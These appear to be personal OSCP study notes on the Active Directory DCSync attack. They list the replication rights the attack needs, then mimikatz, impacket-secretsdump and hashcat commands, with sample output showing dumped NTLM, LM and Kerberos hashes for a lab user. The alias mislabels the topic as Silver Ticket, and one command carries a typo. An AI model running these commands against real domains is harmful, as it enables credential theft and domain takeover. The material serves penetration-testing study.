---
aliases:
  - Active Directory Password Attacks - Silver Ticket
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - active_directory
  - ad
  - adds
  - password_attack
  - dcsync
author: Mehdi N Tehrani
creat_date: 2024-01-07
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Overview
The [_Directory Replication Service_ (DRS) Remote Protocol](https://msdn.microsoft.com/en-us/library/cc228086.aspx) uses [_replication_](https://technet.microsoft.com/en-us/library/cc772726(v=ws.10).aspx) to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the [_IDL_DRSGetNCChanges_](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) API.

Using this attack we can **obtain any domain user's password hash**.
# Attack
#dcsync
[ADsecurity](https://adsecurity.org/?p=2398#MimikatzDCSync)

## Requirement
User's Active Directory Rights either of these:
- _Replicating Directory Changes_
- _Replicating Directory Changes All_
- _Replicating Directory Changes in Filtered Set_

AD groups who usually have these are:
- *Domain Admins*
- *Enterprise Admins*
- *Administrators*


## Tools
### mimikatz
#mimikatz #lsadump_dcsync
```mimikatz
lsadump::dcsync /user:<domain>\<user>
```
example:
```mimikatz
lsadimp::dcsync /user:corp\dave
```
output:
```
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dave

** SAM ACCOUNT **

SAM Username         : dave
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID   : 1103

Credentials:
    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
```

#### Hashcat
#hashcat #mode_1000 #ntlm 
```sh
hashcat -m 1000 hashes.dcsync $wordlist -r $rule
```
### secretsdump
#secretsdump #impacket
[secretsdump - Github](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)

```sh
impacket-secretsdump -just-dc-user $target_username $domain/$user:$pass@$dc_ip
```
output:
```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
[*] Kerberos keys grabbed
dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
[*] Cleaning up... 
```

The output of the tool states that it uses [DRSUAPI](https://wiki.samba.org/index.php/DRSUAPI), the Microsoft API implementing the Directory Replication Service Remote Protocol.